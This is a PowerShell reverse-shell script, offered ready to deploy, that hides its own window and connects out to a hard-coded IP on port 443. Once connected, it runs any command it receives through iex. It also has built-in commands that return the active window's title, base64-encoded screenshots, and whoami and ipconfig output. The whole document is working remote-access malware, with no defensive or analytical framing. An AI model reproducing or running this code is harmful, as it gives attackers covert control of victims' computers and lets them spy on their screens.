# Full-featured reverse shell - deploy with public IP on port 443
param($ip = '77.29.14.116', $port = 443)  # Edit these

$api = Add-Type -Name Win32 -MemberDefinition @'
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
'@ -PassThru

# Hide window
$api::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

try {
    $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $s = $c.GetStream(); $e = New-Object System.Text.UTF8Encoding
    
    # Simple handshake
    $s.Write($e.GetBytes("SHELL`n"), 0, 6)
    
    [byte[]]$respB = New-Object byte[] 32
    $s.Read($respB, 0, 32) | Out-Null
    
    $msg = "`n[+] SHELL CONNECTED`nPS " + $PWD.Path + "> "
    $s.Write($e.GetBytes($msg), 0, $msg.Length)

    while($true) {
        [byte[]]$b = New-Object byte[] 4096
        $i = $s.Read($b, 0, $b.Length)
        if ($i -le 0) { break }
        
        $in = $e.GetString($b, 0, $i).Trim()
        $out = ""

        if ($in -eq 'kill' -or $in -eq 'exit') { break }
        
        elseif ($in -eq 'screen') {
            $handle = $api::GetForegroundWindow()
            $sb = New-Object System.Text.StringBuilder 256
            $api::GetWindowText($handle, $sb, $sb.Capacity)
            $out = "[WINDOW] " + $sb.ToString() + "`n"
        }
        elseif ($in -eq 'screenshot') {
            try {
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing -ErrorAction SilentlyContinue
                $sc = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp = New-Object Drawing.Bitmap $sc.Width, $sc.Height
                $g = [Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($sc.Location, [Drawing.Point]::Empty, $sc.Size)
                $ms = New-Object IO.MemoryStream
                $bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Jpeg, 50L)
                $out = "[BASE64:" + [Convert]::ToBase64String($ms.ToArray()) + "]`n"
                $g.Dispose(); $bmp.Dispose(); $ms.Close()
            } catch { $out = "Screenshot failed`n" }
        }
        elseif ($in -eq 'whoami') { $out = whoami + "`n" }
        elseif ($in -eq 'ipconfig') { $out = ipconfig /all | Out-String }
        else {
            $out = try { iex $in 2>&1 | Out-String } catch { $_.Exception.Message + "`n" }
        }
        
        $prompt = "`nPS " + (Get-Location).Path + "> "
        $resp = $e.GetBytes($out + $prompt)
        $s.Write($resp, 0, $resp.Length)
    }
} catch { exit } finally { if ($c) { $c.Close() }; exit }
